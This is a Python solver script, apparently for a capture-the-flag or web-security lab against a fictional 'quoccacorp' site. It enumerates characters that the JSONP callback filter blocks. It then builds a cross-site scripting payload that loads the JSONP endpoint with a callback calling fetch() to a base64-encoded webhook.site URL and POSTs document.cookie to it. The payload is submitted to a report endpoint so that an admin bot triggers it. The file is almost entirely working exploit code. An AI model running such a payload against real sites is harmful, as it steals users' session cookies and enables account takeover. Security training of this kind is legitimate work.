import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, WebhookSite

import string
import base64

BASE_URL = "https://clients.quoccacorp.com"

class Solver:
    def __init__(self):
        self.session = get_session()
        self.webhooksite = WebhookSite()

    # .
    def get_illegal_chars(self) -> list[str]:
        illegal_chars = []
        for char in string.printable:
            response = self.session.get(f"{BASE_URL}/clients.jsonp", params={"callback": char})
            if response.text == 'alert("illegal callback");':
                illegal_chars.append(char)

        return illegal_chars

    # Example: https://clients.quoccacorp.com/clients.jsonp?q=x&callback=render
    # print(self.get_clients_jsonp_url('x', CALLBACK_PAYLOAD))
    def get_clients_jsonp_url(self, q: str, callback: str) -> str:
        response = self.session.get(f"{BASE_URL}/clients.jsonp", params={
            'q': q,
            "callback": callback
        })
        return response.request.url

    def main(self):
        webhooksite_url_base64 = base64.b64encode(self.webhooksite.url.encode()).decode()
        # CALLBACK_PAYLOAD = f'''(function(){{fetch(atob('{webhooksite_url_base64}'), {{method: 'POST', body: document['cookie']}})}})'''
        CALLBACK_PAYLOAD = f'''fetch(atob('{webhooksite_url_base64}'), {{method: 'POST', body: document['cookie']}})'''
        PAYLOAD = f'''<script src="/clients.jsonp?q=x&callback={CALLBACK_PAYLOAD}"></script>''' # <script> found at the bottom of the DOM at https://clients.quoccacorp.com/?q=x

        # Report and send payload to admin
        self.session.post(f"{BASE_URL}/report", data={'q': PAYLOAD})
        self.webhooksite.find_flags()

if __name__ == "__main__":
    Solver().main()
